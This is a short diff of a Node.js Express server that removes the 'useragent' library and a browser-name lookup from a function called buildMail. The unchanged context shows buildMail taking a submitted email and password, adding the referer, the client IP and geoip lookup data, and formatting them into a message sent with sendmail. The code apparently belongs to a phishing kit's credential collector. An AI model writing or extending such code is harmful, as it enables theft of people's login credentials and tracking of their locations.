@@ -6,7 +6,7 @@ const bodyParser = require("body-parser");
 const requestIp = require("request-ip");
 const geoip = require("geoip-lite");
 const sendmail = require("sendmail")();
-const useragent = require("useragent");
+
 
 const app = express();
 
@@ -35,7 +35,6 @@ function buildMail(email, password, req) {
   const hostName = req.headers.referer || "N/A";
   const ipAddress = getUserIpAddr(req);
   const ipData = ipInfo(ipAddress);
-  const browserName = useragent.parse(req.headers['user-agent']).toAgent();
 
   return `
     Email: ${email} <br>
